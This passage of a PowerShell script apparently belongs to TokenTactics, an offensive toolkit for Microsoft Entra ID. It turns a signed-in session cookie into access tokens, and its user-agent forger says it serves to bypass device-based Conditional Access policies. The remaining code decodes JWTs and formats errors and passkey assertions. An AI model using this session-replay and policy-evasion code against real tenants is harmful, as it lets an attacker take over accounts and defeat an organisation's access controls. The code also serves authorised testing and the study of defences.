    }


    Write-Debug "Response: $($sts_response.RawContent)"
    #region Manual sign-in required
    if ($sts_response.StatusCode -eq 302 -and $sts_response.Headers.Location -notmatch "code=") {
        Write-Verbose "$([char]0x2718)  Single sign-on failed. Redirected to $($sts_response.Headers.Location)"
        $sts_response = Invoke-WebRequest -UseBasicParsing -MaximumRedirection 0 -ErrorAction SilentlyContinue -WebSession $session -Method Get -Uri "$($sts_response.Headers.Location)" -Headers $Headers
        if ( $sts_response.RawContent -match "\`$Config=(.*);" ) {
            $AppConfig = $Matches[1] | ConvertFrom-Json
            Write-Debug "AppConfig: $($AppConfig | ConvertTo-Json -Depth 99 )"
            Invoke-EntraErrorHandling -AppConfig $AppConfig
        } else {
            Write-Output "$([char]0x2718)  Could not find AppConfig in response"
            Write-Output "    Unknown error occurred"
            Write-Debug "Response: $($sts_response.RawContent)"
        }
        return
    }
    #endregion

    if ($sts_response.StatusCode -eq 302) {
        if ($PSVersionTable.PSEdition -ne "Core") {
            $RequestURL = $sts_response.Headers.Location
        } else {
            $RequestURL = $sts_response.Headers.Location[0]
        }
        $queryParams = ConvertTo-URLParameters -RequestURL $RequestURL

        # When code is present, we have a valid refresh token and can use it to request a new token
        if ($queryParams.ContainsKey('code')) {
            $AuthorizationCode = $queryParams['code']
            Write-Verbose "Authorization Code: $($AuthorizationCode[0..10] -join '' )..."
        } else {
            Write-Output "$([char]0x2718)  Code not found in redirected URL path"
            Write-Output "    Requested URL: $($RequestURL)"
            Write-Output "    Response Code: $($sts_response.StatusCode)"
            Write-Output "    Response URI:  $($sts_response.Headers.Location)"
            return
        }
    } else {
        $sts_response.RawContent -match "\`$Config=(.*);" | Out-Null
        $AppConfig = $Matches[1] | ConvertFrom-Json
        Write-Debug "AppConfig: $($AppConfig | ConvertTo-Json -Depth 99)"
        Invoke-EntraErrorHandling -AppConfig $AppConfig
        return
    }

    if ($AuthorizationCode) {
        $body = @{
            "client_id"    = $ClientID
            "grant_type"   = "authorization_code"
            "redirect_uri" = $RedirectUrl
            "code"         = $AuthorizationCode
            "scope"        = $Scope
        }
        if ($UseV1Endpoint) {
            $body.Add("resource", $Resource)
        }
        if ($UseCAE -and ( $UseV1Endpoint -eq $false )) {
            # Add 'cp1' as client claim to get a access token valid for 24 hours
            $Claims = ( @{"access_token" = @{ "xms_cc" = @{ "values" = @("cp1") } } } | ConvertTo-Json -Compress -Depth 99 )
            $body.Add("claims", $Claims)
        }
        if ($CodeVerifier) {
            $body.Add("code_verifier", $CodeVerifier)
        }
        Write-Verbose "Calling token endpoint with Authorization Code"
        Write-Verbose ( $body | ConvertTo-Json -Depth 99 )

        try {
            if ($UseV1Endpoint) {
                $TokenEndpointUri = "https://login.microsoftonline.com/common/oauth2/token"
            } else {
                $TokenEndpointUri = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
            }
            $global:response = Invoke-RestMethod -UseBasicParsing -Method Post -Uri $TokenEndpointUri -Headers $Headers -Body $body
            $output = ConvertFrom-JWTtoken -token $response.access_token
            $global:TokenDomain = $output.upn -split '@' | Select-Object -Last 1
            $global:TokenUpn = $output.upn
            Write-Output "$([char]0x2713)  Token acquired and saved as `$response"
        } catch {
            Write-Error "Could not get tokens $($_.ErrorDetails | ConvertFrom-Json | Select-Object -ExpandProperty error_description)"
        }
    }
}

function Get-ForgedUserAgent {
    <#
    .DESCRIPTION
        Forge the User-Agent when sending requests to the Microsoft API's. Useful for bypassing device specific Conditional Access Policies. Defaults to Windows Edge.
    #>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory = $False)]
        [ValidateSet('Mac', 'Windows', 'Linux', 'AndroidMobile', 'iPhone', 'OS/2')]
        [string]$Device = "Windows",
        [Parameter(Mandatory = $False)]
        [ValidateSet('Android', 'IE', 'Chrome', 'Firefox', 'Edge', 'Safari')]
        [string]$Browser = "Edge",
        [string]$CustomUserAgent
    )
    Process {
        if ($PSBoundParameters.ContainsKey('CustomUserAgent') -and $CustomUserAgent) {
            return $CustomUserAgent
        }
        if ($Device -eq 'Mac') {
            if ($Browser -eq 'Chrome') {
                $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36'
            } elseif ($Browser -eq 'Firefox') {
                $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:70.0) Gecko/20100101 Firefox/70.0'
            } elseif ($Browser -eq 'Edge') {
                $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/604.1 Edg/91.0.100.0'
            } elseif ($Browser -eq 'Safari') {
                $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'
            } else {
                Write-Warning "Browser $($Browser) not valid for device platform $($Device), defaulting to macOS/Safari"
                $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'
            }
        } elseif ($Device -eq 'Windows') {
            if ($Browser -eq 'IE') {
                $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko'
            } elseif ($Browser -eq 'Chrome') {
                $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36'
            } elseif ($Browser -eq 'Firefox') {
                $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:70.0) Gecko/20100101 Firefox/70.0'
            } elseif ($Browser -eq 'Edge') {
                $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19042'
            } else {
                Write-Warning "Browser $($Browser) not valid for device platform $($Device), defaulting to Windows/Edge"
                $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19042'
            }
        } elseif ($Device -eq 'AndroidMobile') {
            if ($Browser -eq 'Android') {
                $UserAgent = 'Mozilla/5.0 (Linux; U; Android 4.0.2; en-us; Galaxy Nexus Build/ICL53F) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'
            } elseif ($Browser -eq 'Chrome') {
                $UserAgent = 'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36'
            } elseif ($Browser -eq 'Firefox') {
                $UserAgent = 'Mozilla/5.0 (Android 4.4; Mobile; rv:70.0) Gecko/70.0 Firefox/70.0'
            } elseif ($Browser -eq 'Edge') {
                $UserAgent = 'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Mobile Safari/537.36 EdgA/103.0.1264.71'
            } else {
                Write-Warning "Browser $($Browser) not valid for device platform $($Device), defaulting to Android/Chrome"
                $UserAgent = 'Mozilla/5.0 (Linux; U; Android 4.0.2; en-us; Galaxy Nexus Build/ICL53F) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'
            }
        } elseif ($Device -eq 'iPhone') {
            if ($Browser -eq 'Chrome') {
                $UserAgent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/91.0.4472.114 Mobile/15E148 Safari/604.1'
            } elseif ($Browser -eq 'Firefox') {
                $UserAgent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) FxiOS/1.0 Mobile/12F69 Safari/600.1.4'
            } elseif ($Browser -eq 'Edge') {
                $UserAgent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 EdgiOS/44.5.0.10 Mobile/15E148 Safari/604.1'
            } elseif ($Browser -eq 'Safari') {
                $UserAgent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1'
            } else {
                Write-Warning "Browser $($Browser) not valid for device platform $($Device), defaulting to iPhone/Safari"
                $UserAgent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1'
            }
        } elseif ($Device -eq 'Linux') {
            if ($Browser -eq 'Chrome') {
                $UserAgent = 'Mozilla/5.0 (M12; Linux X12-12) AppleWebKit/806.12 (KHTML, like Gecko) Ubuntu/23.04 Chrome/113.0.5672.63 Safari/16.4.1'
            } elseif ($Browser -eq 'Firefox') {
                $UserAgent = 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.14) Gecko/2009090217 Ubuntu/9.04 (jaunty) Firefox/52.7.3'
            } elseif ($Browser -eq 'Edge') {
                $UserAgent = 'Mozilla/5.0 (Wayland; Linux x86_64; Surface) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Ubuntu/23.04 Edg/114.0.1823.43'
            } else {
                Write-Warning "Browser $($Browser) not valid for device platform $($Device), defaulting to Linux/Firefox"
                $UserAgent = 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.14) Gecko/2009090217 Ubuntu/9.04 (jaunty) Firefox/52.7.3'
            }
        } elseif ($Device -eq 'OS/2') {
            if ($Browser -eq 'Firefox') {
                $UserAgent = 'Mozilla/5.0 (OS/2; U; Warp 4.5; en-US; rv:80.7.12) Gecko/20050922 Firefox/80.0.7'
            } else {
                Write-Warning "Browser $($Browser) not valid for device platform $($Device), defaulting to OS/2 Firefox"
                $UserAgent = 'Mozilla/5.0 (OS/2; U; Warp 4.5; en-US; rv:80.7.12) Gecko/20050922 Firefox/80.0.7'
            }
        } else {
            if ($Browser -eq 'Android') {
                Write-Warning "Device platform not found, defaulting to Android"
                $UserAgent = 'Mozilla/5.0 (Linux; U; Android 4.0.2; en-us; Galaxy Nexus Build/ICL53F) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'
            } elseif ($Browser -eq 'IE') {
                Write-Warning "Device platform not found, defaulting to Windows/IE"
                $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko'
            } elseif ($Browser -eq 'Chrome') {
                Write-Warning "Device platform not found, defaulting to macos/Chrome"
                $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36'
            } elseif ($Browser -eq 'Firefox') {
                Write-Warning "Device platform not found, defaulting to Windows/Firefox"
                $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:70.0) Gecko/20100101 Firefox/70.0'
            } elseif ($Browser -eq 'Safari') {
                Write-Warning "Device platform not found, defaulting to Safari"
                $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'
            } else {
                Write-Warning "Device platform not found, defaulting to Windows/Edge"
                $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19042'
            }
        }
        return $UserAgent
    }
}

function Invoke-EntraErrorHandling {
    [cmdletbinding()]
    param (
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [PSCustomObject]$AppConfig
    )

    #region Define variables
    $ErrorTitle = ( "Your account is blocked",
        "You cannot access this right now",
        "You can't get there from here",
        "Oops - You can't get to this yet",
        "You don't have access to this",
        "Help us keep your device secure",
        "Your sign-in was blocked",
        "You cannot proceed right now",
        "Set up your device to get access",
        "Get access to this resource",
        "Sorry, you can't get to this yet",
        "Try signing in another way",
        "Register or enroll your device",
        "Sorry, a security policy is preventing access",
        "Let's try something else",
        "Sign in with your work account",
        "Device must comply with your organization's compliance requirements",
        "We need to update your device registration",
        "Install or update Microsoft Authenticator to continue",
        "Install or update Microsoft Company Portal to continue"
    )
    $ErrorDescription = @(
        "We've detected suspicious activity on your account.",
        "It looks like you're trying to open this resource with an app that hasn't been approved by your IT department. Ask them for a list of approved applications.",
        "Your sign-in was successful but your admin requires your device to be managed by {0} to access this resource.",
        "Your sign-in was successful but does not meet the criteria to access this resource. For example, you might be signing in from a browser, app, or location that is restricted by your admin.",
        "Your sign-in was successful but you don't have permission to access this resource.",
        "Your IT department is ensuring that this device is up-to-date with all your organization's policies. It might take a few minutes.",
        "Your sign-in was successful but your admin requires the device requesting access to be managed by {0} to access this resource.",
        "You cannot access the resource from this browser on your device. You need to use Safari or Intune Managed Browser.",
        "You cannot access the resource from this browser on your device. You need to use Microsoft Edge.",
        "Your sign-in was successful, but you can't open this resource from this web browser. You might be able to access it from the Safari browser (ask your IT department for a list of approved mobile and desktop applications).",
        "You cannot access the resource from this browser on your device. You need to use Chrome or Intune Managed Browser.",
        "You cannot access the resource from this browser on your device. You need to use Chrome or Edge.",
        "You must use the Intune Managed Browser application before you can access this resource.",
        "You must use Microsoft Edge to access this resource.",
        "To access this resource, sign in or switch to your work or school account in Microsoft Edge.",
        "This application contains sensitive information and can only be accessed from:",
        "We've detected something unusual about this sign-in. For example, you might be signing in from a new location, device, or app. Before you can continue, we need to verify your identity. Please contact your admin.",
        "Your device isn't up to date with your organization\'s policies. Check its status and take action in your organization's device management portal",
        "Your sign-in was successful, but your device must be registered with {0} before you can use this site.",
        "It looks like you're trying to open this resource with a client app that is not available for use with app protection policies. Ask your IT department or see a list of applications that are protected here.",
        "It looks like you're trying to open this resource with a client app that is not available for use with app protection policies. Please try using the latest version of the client application or ask your IT department. You can see a list of applications that are protected here.",
        "We are currently unable to collect additional security information. Your organization requires this information to be set from specific locations or devices.",
        "Your sign-in was successful but does not meet the criteria to add an account to the Microsoft Authenticator app. For example, you might be signing in from a location or device that is restricted by your admin. You may add an account to the app by scanning a QR Code provided to you by your admin.",
        "{0} requires you to secure this device before you can access {0} email, files and data.",
        "This device does not meet your organization's compliance requirements. Open your organization's device management portal to take action.",
        "You can't complete this action because you're trying to access protected resources as an external user in this organization. Please contact the admin to allow you to access the protected resources.",
        "To access your service, app, or website, you may need to sign in to Microsoft Edge using {1}",
        "To access this app, website, or service, you'll need to register or enroll your device.",
        "An organization security policy requiring token protection is preventing this application from accessing the resource. You may be able to use a different application.",
        "Additional sign-in methods are required to access this resource. Contact your administrator to enable these methods.",
        "An authentication policy cannot be fulfilled. Please contact your administrator."
    )
    #endregion

    #region Output nice error messages
    if ($AppConfig.sErrorCode -eq "50058") {
        Write-Output "$([char]0x274C) Error code $($AppConfig.sErrorCode) received from the authorize endpoint"
        Write-Output "   Session information is not sufficient for single-sign-on."
        Write-Output "   This means that a user is not signed in. The cookie might have expired."
        Write-Output "$([char]0x26A0)  TokenTactics does not support interactive logins."
        Write-Output "   Please get a valid cookie from a signed-in session or use Get-AzureToken to get a token via the device code flow."
    } elseif ($AppConfig.sErrorCode -eq "53003") {
        Write-Output "$([char]0x274C) Error code $($AppConfig.sErrorCode) received from the authorize endpoint"
        Write-Output "   Access has been blocked by Conditional Access policies. The access policy does not allow token issuance."
        Write-Output "   If this is unexpected, see the conditional access policy that applied to this request in the Azure Portal."
        if ( -not [string]::IsNullOrWhiteSpace($AppConfig.urlTokenBindingLearnMore)) {
            Write-Output "   Learn more about token binding - $($AppConfig.urlTokenBindingLearnMore)"
        }
    } elseif (-not [string]::IsNullOrWhiteSpace($AppConfig.sErrorCode)) {
        Write-Output "$([char]0x274C)  Error code $($AppConfig.sErrorCode) received from the authorize endpoint"
        Write-Output "   $($ErrorTitle[$AppConfig.iErrorTitle - 1])"
        Write-Output "   $($ErrorDescription[$AppConfig.iErrorDescription - 1])"
    } elseif ( -not [string]::IsNullOrWhiteSpace($AppConfig.strMainMessage) ) {
        Write-Output "$([char]0x274C)  $($AppConfig.strMainMessage)"
        Write-Output "   $($AppConfig.strServiceExceptionMessage)"
    } else {
        Write-Output "$([char]0x274C)  No error code received from the authorize endpoint"
    }
    if ( -not [string]::IsNullOrWhiteSpace($AppConfig.sDeviceId)) {
        Write-Output "$([char]0x2718)  Device Id:`t`t$($AppConfig.sDeviceId)"
    }
    if ( -not [string]::IsNullOrWhiteSpace($AppConfig.sDeviceState)) {
        Write-Output "$([char]0x2718)  Device state:`t$($AppConfig.sDeviceState)"
    }
    if ( -not [string]::IsNullOrWhiteSpace($AppConfig.correlationId)) {
        Write-Output "$([char]0x2718)  Correlation Id:`t$($AppConfig.correlationId)"
    }
    if ( -not [string]::IsNullOrWhiteSpace($AppConfig.sessionId)) {
        Write-Output "$([char]0x2718)  Session Id:`t`t$($AppConfig.sessionId)"
    }
    if ( -not [string]::IsNullOrWhiteSpace($AppConfig.sPOST_Username)) {
        Write-Output "$([char]0x2718)  Username:`t`t$($AppConfig.sPOST_Username)"
    }
    #endregion
}

function ConvertTo-URLParameters {
    [CmdletBinding()]
    param (
        [Parameter()]
        [string]
        $RequestURL
    )
    $uri = [System.Uri]::new($RequestURL)
    # Get the parameters from the redirect URI and build a hashtable containing the different parameters
    $query = $uri.Query.TrimStart('?')
    $queryParams = @{}
    $paramPairs = $query.Split('&')

    foreach ($pair in $paramPairs) {
        $parts = $pair.Split('=')
        $key = $parts[0]
        $value = $parts[1]
        $queryParams[$key] = $value
    }
    return $queryParams
}

function ConvertFrom-JWTtoken {
    <#
    .DESCRIPTION
        Parse JWTtoken code from https://www.michev.info/Blog/Post/2140/decode-jwt-access-and-id-tokens-via-powershell
    .EXAMPLE
        ConvertFrom-JWTtoken -Token ey....
    #>
    [cmdletbinding()]
    param(
        [Alias("access_token", "id_token")]
        [Parameter(Mandatory = $true,
            ValueFromPipeline = $true,
            ValueFromPipelineByPropertyName = $true)]
        [string]$token
    )

    if (!$token.Contains(".") -or !$token.StartsWith("eyJ")) { Write-Error "Invalid token" -ErrorAction Stop }

    $TokenHeader = $token.Split(".")[0].Replace('-', '+').Replace('_', '/')

    while ($TokenHeader.Length % 4) {
        $TokenHeader += "="
    }
    $TokenHeaderObject = [System.Text.Encoding]::ASCII.GetString([system.convert]::FromBase64String($TokenHeader)) | ConvertFrom-Json
    Write-Verbose ( $TokenHeaderObject  | Out-String -Width 100 )

    $TokenPayload = $token.Split(".")[1].Replace('-', '+').Replace('_', '/')

    while ($TokenPayload.Length % 4) {
        $TokenPayload += "="
    }

    $tokenArray = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($TokenPayload))

    $TokenObject = $tokenArray | ConvertFrom-Json
    if (-not [string]::IsNullOrWhiteSpace($TokenObject.iat)) {
        $TokenObject | Add-Member -NotePropertyName "IssuedAt" -NotePropertyValue (Get-Date "01.01.1970").AddSeconds($TokenObject.iat)
    }
    if (-not [string]::IsNullOrWhiteSpace($TokenObject.nbf)) {
        $TokenObject | Add-Member -NotePropertyName "NotBefore" -NotePropertyValue (Get-Date "01.01.1970").AddSeconds($TokenObject.nbf)
    }
    if (-not [string]::IsNullOrWhiteSpace($TokenObject.exp)) {
        $TokenObject | Add-Member -NotePropertyName "ExpirationDate" -NotePropertyValue (Get-Date "01.01.1970").AddSeconds($TokenObject.exp)
    }
    if (-not [string]::IsNullOrWhiteSpace($TokenObject.IssuedAt)) {
        $TokenObject | Add-Member -NotePropertyName "ValidForHours" -NotePropertyValue (New-TimeSpan -Start $TokenObject.IssuedAt -End $TokenObject.ExpirationDate | Select-Object -ExpandProperty TotalHours)
    }
    return $TokenObject
}

function ConvertTo-EntraAssertionPayload {
    [CmdletBinding()]
    [OutputType([string])]
    param (
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string] $PublicKeyCredentialJson
    )

    [psobject] $publicKeyCredential = $PublicKeyCredentialJson | ConvertFrom-Json

    if ($null -ne $publicKeyCredential.response) {
        [hashtable] $entraAssertionResponse = [ordered]@{
            id                = $publicKeyCredential.id
            clientDataJSON    = $publicKeyCredential.response.clientDataJSON
            authenticatorData = $publicKeyCredential.response.authenticatorData
            signature         = $publicKeyCredential.response.signature
            userHandle        = $publicKeyCredential.response.userHandle
        }

        return $entraAssertionResponse | ConvertTo-Json -Compress -Depth 10
    } else {
        throw 'The PublicKeyCredential is missing the response property.'
    }
}

# Run the main function from the beginning of the script
Main
